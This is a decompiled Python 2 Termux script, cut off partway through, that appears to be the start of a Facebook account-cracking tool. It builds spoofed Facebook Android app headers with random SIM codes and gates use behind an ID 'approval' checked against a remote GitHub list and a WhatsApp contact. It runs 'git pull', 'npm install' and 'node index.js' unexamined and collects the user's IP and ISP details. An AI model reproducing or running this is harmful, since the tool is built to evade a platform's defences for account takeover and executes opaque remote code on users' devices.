#!/usr/bin/python2
# coding=utf-8

# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <MR_DARK>
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'Mr.james'
__copyright = 'All rights reserved . Copyright  Mr.James'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 
   'x-fb-sim-hni': repr(sim), 
   'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')
logo = '\n\x1b[1;92m    AHAD XE ASAD        .SSS\n\x1b[1;92m   AHAD XE ASAD \n\x1b[1;91m   AHAD XE ASAD\n\x1b[1;91m   AHAD XE ASAD AHAD XE ASAD\n\x1b[1;97m   AHAD XE ASAD\xe2\x80\xa2AHAD XE ASAD\n\x1b[1;97m   AHAD XE ASAD ASAD XE AHAD\n\x1b[1;94m   AHAD XE ASAD ASAD XE AHAD\n\x1b[1;94m   AHAD XE ASAD ASAD XE AHAD\n\x1b[1;93m   AHAD XE ASAD ASAD XE AHAD\n\x1b[1;93m  .AHAD XE ASAD ASAD XE AHAD \n\x1b[1;96m   AHAD XE ASAD AHAD XE ASAD\n\x1b[1;96m        \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : AHAD x ASAD\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/asad592/asad\n\x1b[1;97m\xe2\x9e\xa3 WP NO: +923447169700\n\x1b[1;91m-----------------------------------------------'

def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mTake The Free Approval For Login'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/asad592/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \x1b[1;92mYour Id Is Not Approved Already '
        print ' \x1b[1;92mCopy the id and send to admin'
        print ' \x1b[1;92mYour id: ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923447169700')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter , then select whatsapp to continue'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923447169700')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print '\tCollecting device info'
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\x1b[1;92m Your ip: ' + ips
    time.sleep(1)
    print '\x1b[1;92m Your country: ' + country
    time.sleep(1)
    print '\x1b[1;92m Your regio
